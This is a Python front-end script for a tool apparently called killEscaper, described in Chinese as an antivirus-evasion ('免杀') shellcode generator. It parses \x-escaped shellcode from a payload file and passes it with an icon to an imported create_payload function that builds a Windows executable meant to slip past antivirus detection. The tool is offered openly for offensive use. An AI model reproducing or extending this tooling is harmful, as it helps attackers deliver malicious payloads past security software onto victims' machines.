#coding: utf-8

from Shellcode2exe import *
import argparse
import re
import binascii

logo =""" 
_    _ _ _ _____ 
| | _(_) | | ____|___  ___ __ _ _ __   ___ _ __ 
| |/ / | | |  _| / __|/ __/ _` | '_ \ / _ \ '__|
|   <| | | | |___\__ \ (_| (_| | |_) |  __/ |   
|_|\_\_|_|_|_____|___/\___\__,_| .__/ \___|_|   
                               |_|              
    @Title: killEscaper_ShellCode免杀生成器
    @Author: Anyyy
    @Blog: https://www.anyiblog.top/
    @env：Windows系统、Python3

"""

print(logo)

usage="python %(prog)s -a <32/64> -f <ShellCode File> -i <Icon file>"  #用于显示帮助信息

parser = argparse.ArgumentParser(usage=usage,description="使用说明：")
parser.add_argument('-a','--arch',required=False, type=int, default=64, help='shellcode对应的操作系统位数 默认为64位')
parser.add_argument('-f','--file',required=False, type=str, default=None, help='任何包含shellcode的Payload文件 用于读取并生成')
parser.add_argument('-i','--icon',required=False,type=str, default=None, help='exe的Icon图标')
parser.add_argument('-c','--clean',action="store_true",required=False,default=None, help='清理output输出文件')
args = parser.parse_args()
arch, file, icon, clean = args.arch,args.file,args.icon,args.clean

if clean == True:
    clean_output()
else:
    if file != None:
        if arch in [32,64]:
            content = open(file,'rb').read()
            hexs = b''.join(re.findall(rb'\\x([0-9a-fA-F]{2})',content))
            shellcode = binascii.unhexlify(hexs)
            if shellcode != b'':
                print('[*] 读取文件shellcode成功，正在利用算法生成免杀中\n')
                create_payload(arch,shellcode,icon)
            else:
                print('[-] 检查指定文件是否存在shellcode！')
                exit()
        else:
            print('[-] 操作系统位数只能是32或64位！')
            exit()
    else:
        parser.print_help()